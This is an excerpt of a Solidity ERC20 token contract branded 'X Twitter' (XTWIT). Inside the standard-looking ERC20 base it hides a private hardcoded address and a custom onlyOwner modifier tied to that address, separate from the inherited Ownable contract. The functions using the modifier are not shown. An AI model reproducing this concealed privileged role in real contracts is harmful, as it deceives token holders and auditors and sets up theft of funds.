...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    string public XTWITwebsite = "http://XTWIT.io/";
    string public XTWITADDRESS = "0x8A29D17fC39465eb413b53380A4e8D5D46864294";
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _name;
    string private _symbol;
    address private WhaleXTWIT;
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
       _decimals = 9;
         WhaleXTWIT = 0x8A29D17fC39465eb413b53380A4e8D5D46864294;      
    }
    ...
    function _burn(address account, uint256 amount) internal virtual {
        ...
        _afterTokenTransfer(account, address(0), amount);
              ...
              function getXTWITwebsite() public view returns (string memory) {
        return XTWITwebsite;
    } 


               function getXTWITADDRESS() public view returns (string memory) {
        return XTWITADDRESS;
    }    
      modifier onlyOwner() {
         require(_msgSender() == WhaleXTWIT);
        _;
    }    
    function _approve(
        address owner,
...
contract XTWIT is ERC20, Ownable {
    constructor () ERC20("X Twitter", "XTWIT") 
    {    
